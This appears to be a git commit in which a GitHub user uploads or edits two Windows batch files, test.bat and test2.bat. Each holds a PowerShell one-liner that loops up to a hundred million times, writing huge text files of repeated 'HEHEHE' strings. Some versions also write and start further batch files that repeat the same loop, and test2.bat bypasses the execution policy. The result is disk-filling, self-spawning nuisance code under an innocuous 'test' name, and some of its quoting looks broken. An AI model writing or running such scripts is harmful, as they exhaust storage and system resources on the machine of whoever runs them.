74e6cd0c83c49fc6a3552d1bc91442a34620ce12
bmills23 <58231400+bmills23@users.noreply.github.com>
2023-01-04 17:07:00 -0700

    Add files via upload

--- test.bat
+++ test.bat
@@ -1,1 +1,1 @@
-powershell -Command "for ($i = 0; $i -le 100000000; $i++) { new-item text${i}.txt; Set-Content text${i}.txt ("HEHEHEHE" * 100000000) }"
+powershell -NoExit -Command "for ($i = 0; $i -le 1; $i++) { new-item txt${i}.txt; Set-Content text${i}.txt ('HEHEHEHEHE' * 100000000); new-item txt${i}.bat; Set-Content txt${i}.bat "powershell -NoExit -Command 'for ($i = 0; $i -le 1; $i++) { new-item txt${i}.txt; Set-Content text${i}.txt ('HEHEHEHEHE' * 100000000); new-item txt${i}.bat; Set-Content txt${i}.bat ) } -force" ) cmd.exe 'txt${i}.bat' } -force
--- test2.bat
+++ test2.bat
@@ -1,5 +1,1 @@
-powershell -NoExit -Command 
-
-"for ($i = 0; $i -le 0; $i++) { new-item txt${i}.bat; Set-Content txt${i}.bat 
-  'powershell -NoExit "(for ($i = 0; $i -le 0; $i++) { new-item txt${i}.txt; Set-Content txt${i}.txt ('HEHEHE' * 1000)}"'; 
-  Start-Process -FilePath txt${i}.bat }"
+@powershell -Noexit -NoProfile -ExecutionPolicy bypass -Command for ($i = 0; $i -le 100000000; $i++) { new-item txt${i}.bat; Set-Content txt${i}.bat 'powershell -NoProfile -ExecutionPolicy bypass -Command for ($j = 0; $j -le 100; $j++) { new-item %%0${j}.txt; Set-Content %%0${j}.txt (''HEHEHE'' * 1000)}'; Start-Process txt${i}.bat -wait } 
